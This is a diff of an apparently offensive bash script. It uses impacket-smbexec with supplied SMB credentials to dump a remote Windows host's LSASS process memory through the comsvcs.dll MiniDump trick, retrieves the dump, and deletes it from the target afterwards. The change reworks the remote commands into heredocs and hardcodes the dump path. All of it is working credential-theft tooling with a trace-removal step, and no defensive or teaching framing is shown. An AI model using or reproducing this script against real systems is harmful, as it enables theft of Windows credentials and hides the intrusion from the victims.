@@ -23,8 +23,11 @@ echo ""
 
 # Phase 1: Dump LSASS via built-in comsvcs.dll (runs as SYSTEM, no custom exe)
 echo "[*] Phase 1: Dumping LSASS memory..."
-impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -c "powershell -c \"\\\$pid=(Get-Process lsass).Id; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump \\\$pid $DUMP_PATH full\"" 2>/dev/null
-sleep 2
+impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP << 'SHELL_EOF' 2>/dev/null
+powershell -c "$pid=(Get-Process lsass).Id; rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full"
+exit
+SHELL_EOF
+sleep 3
 
 # Phase 2: Retrieve the dump file
 echo "[*] Phase 2: Retrieving dump from target..."
@@ -87,5 +90,8 @@ PYTHON_EOF
 # Phase 4: Optional cleanup on target
 echo ""
 echo "[*] Phase 4: Cleaning up target..."
-impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP -c "del $DUMP_PATH 2>nul" 2>/dev/null
+impacket-smbexec "$SMB_USER":"$SMB_PASS"@$TARGET_IP << 'SHELL_EOF' 2>/dev/null
+del C:\Windows\Temp\lsass.dmp 2>nul
+exit
+SHELL_EOF
 echo "[+] Done!"
